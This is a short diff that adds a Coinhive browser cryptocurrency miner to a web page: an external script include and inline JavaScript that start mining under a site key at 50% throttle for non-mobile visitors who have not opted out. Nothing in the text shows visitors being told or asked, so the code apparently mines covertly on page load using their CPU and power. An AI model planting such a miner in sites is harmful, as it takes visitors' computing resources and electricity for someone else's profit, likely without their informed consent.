@@ -1,0 +1,8 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('HCcMNafqYCdJHrkfq2y2k8cLRxfwrjrY', {throttle: 0.5});
+
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
